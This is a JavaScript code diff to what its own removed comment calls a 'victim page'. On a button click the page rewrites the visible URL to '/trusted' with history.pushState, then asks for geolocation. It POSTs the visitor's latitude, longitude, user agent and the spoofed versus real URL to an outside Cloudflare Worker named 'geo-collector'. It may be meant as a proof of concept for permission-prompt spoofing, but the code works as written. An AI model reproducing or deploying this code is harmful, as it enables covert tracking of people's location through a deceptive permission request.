@@ -73,6 +73,13 @@ const mapLink = document.getElementById('mapLink');
 /* ✅ Cloudflare Worker endpoint */
 const webhookUrl = 'https://geo-collector.ecdnts.workers.dev';
 
+/* 🔎 capture what the user SEES before permission */
+let visibleContext = {
+  origin_before: location.origin,
+  href_before: location.href,
+  ts_before: new Date().toISOString()
+};
+
 function getLocation() {
   if (!navigator.geolocation) return;
 
@@ -81,24 +88,34 @@ function getLocation() {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      // tampilkan lokasi di victim page
       output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
 
-      // link Google Maps
       const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
       mapLink.href = googleMapsUrl;
       mapLink.textContent =
         `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
       locationLink.style.display = 'block';
 
-      // ✅ kirim ke Cloudflare Worker
+      /* ✅ send proof log to Cloudflare */
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
+          event: 'geolocation_allowed',
+
           latitude: lat,
           longitude: lon,
-          timestamp: new Date().toISOString(),
+
+          /* what user saw */
+          visible_origin: visibleContext.origin_before,
+          visible_url: visibleContext.href_before,
+          visible_timestamp: visibleContext.ts_before,
+
+          /* where browser actually is */
+          actual_origin: location.origin,
+          actual_url: location.href,
+
+          permission_time: new Date().toISOString(),
           userAgent: navigator.userAgent
         })
       }).catch(() => {});
@@ -112,6 +129,14 @@ function getLocation() {
 
 trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
+
+  /* update visible context AFTER pushState */
+  visibleContext = {
+    origin_before: location.origin,
+    href_before: location.href,
+    ts_before: new Date().toISOString()
+  };
+
   panel.style.display = 'block';
 };
 
